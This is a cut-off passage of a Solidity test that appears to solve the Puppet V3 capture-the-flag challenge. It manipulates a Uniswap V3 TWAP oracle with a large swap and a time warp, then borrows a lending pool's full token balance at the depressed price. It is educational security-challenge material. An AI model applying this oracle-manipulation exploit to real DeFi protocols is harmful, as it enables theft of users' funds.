...
contract PuppetV3Challenge is Test {
    ...
    function test_puppetV3() public checkSolvedByPlayer {
        // Use SwapRouter: https://docs.uniswap.org/contracts/v3/reference/deployments/ethereum-deployments
        ISwapRouter router = ISwapRouter(
            0xE592427A0AEce92De3Edee1F18E0157C05861564
        );
        uint256 quoteBeforeSwap = lendingPool.calculateDepositOfWETHRequired(
            LENDING_POOL_INITIAL_TOKEN_BALANCE
        );
        ISwapRouter.ExactInputParams memory input = ISwapRouter
            .ExactInputParams({
        ...
        uint256 wethOut = router.exactInput(input);
        uint256 quoteAfterSwap = lendingPool.calculateDepositOfWETHRequired(
            LENDING_POOL_INITIAL_TOKEN_BALANCE
        );
        // uniswap v3 oracle will prevent price manipulation in the same block
        assertEq(quoteBeforeSwap, quoteAfterSwap);
        // get lowest oracle price
        vm.warp(initialBlockTimestamp + 114);
        uint256 quoteAfterDelay = lendingPool.calculateDepositOfWETHRequired(
            LENDING_POOL_INITIAL_TOKEN_BALANCE
        );
        weth.deposit{ value: player.balance }();
        assertGt(weth.balanceOf(player), quoteAfterDelay);
        weth.approve(address(lendingPool), type(uint256).max);
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
        
        assertGt(weth.balanceOf(player), wethOut);
        input = ISwapRouter
            .ExactInputParams({
                path: abi.encodePacked(
                    bytes20(address(weth)),
